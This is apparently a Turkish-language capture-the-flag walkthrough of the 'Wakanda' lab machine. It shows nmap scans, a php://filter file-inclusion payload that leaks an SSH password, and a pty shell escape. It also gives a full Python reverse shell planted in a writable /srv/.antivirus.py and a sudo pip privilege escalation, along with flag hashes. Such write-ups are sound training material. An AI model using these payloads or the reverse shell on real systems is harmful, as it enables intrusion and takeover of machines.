İlk olarak nmap 10.0.2.7/24(mylocaladdres) -sn -T4 çalıştırarak local ağımdaki wakandanın ip addresini öğrendim.
Daha sonra Wakanda ip sini nmap'de taradım. "nmap 10.0.2.7 -sv -A -T4 -p- "
Wakanda içinde bir adet 80 http ve 3333 de çalışan ssh servislerini keşfettim.

İnternete giderek 10.0.2.7 yazarak wakandanın web siteni buldum.Daha sonra burda yaptığım araştırmalar sonucu file include açığı olduğunu buldum.
"10.0.2.7/?lang=pHp://FilTer/convert.base64-encode/resource=index" gidince çıkan Base64 ile encript edilmiş kodu alıp decode ederek ssh login password buldum.Password=Niamey4Ever227!!! 
Username:mamadou  username web sitenin page source verilmişti. 

Daha sonra teminale giderek "ssh mamadou@10.0.2.7 -p 3333" diyerek ssh serverına bağlandım.Servera bağlandıktan sonra sadece python kodu çalıştırabildiğimi anladım.
Komut satırana:
    "import pty"
    "pty.spawn(/bin/bash)"
Python ile shell getirme kodunu yazdım.
Bu işlemleri Yaptıktan sonra Wakanda serverına giriş yaptım. ls çalıştırdığımda flag1.txt gördüm. cat flag1.txt: d86b9ad71ca887f4dd1dac86ba1c4dfc flag1 aldım daha sonra cd/home içinde 
"devops" diye bir kullanıcı buldum. "cd devops" devops klasorüne girdim içinde flag2.txt gördüm ama o text dosyasını açmaya yetki yoktu. Kendimi devops kullanıcısı yapmaya çalıştım.
devops kullanıcısının açmaya yetkisi olan dosyaları "find / -user devops " komutu ile listeledim. Birçok dosyayı açmaya yetkim yoktu sadece "/srv/.antivirus.py" lokasyonunda 
olan dosya mamadou olarak açabiliyordum. Dosyanın konumuna gitim ve python dosyasını açtım python dosyasının içine python reverse_shell getirme kodunu yazdım python kodunuda google dan buldum.
Python Reverse Shell Kodu
    import socket
    import subprocess
    import os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.2.0.7",1234))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)    
    p=subprocess.call(["/bin/sh","-i"])
Kodu yazdıktan sonra terminal de "nc -nvpl 1234" diyerek dinleme yapmaya başladım.Kod çalışanca artk devops olarak sunucuya giriş yaptım.
"ls" çalıştırıp flag2.txt:d8ce56398c88e1b4d9e5f83e64c79098 aldım. "sudo -l " çalıştırdığımda sunucuda "/usr/bin/pip" diye bir şey çalıştırdığımı gördüm.
Google da python pip root diye arama yaptığımda. Fakepip diye bir github reposu buldum bunu git clone ile sunucuya indirdim.İçerini biraz değiştirip .Daha sonra fakepip çalıştırdığımda 
Sunucuda root oldum.   




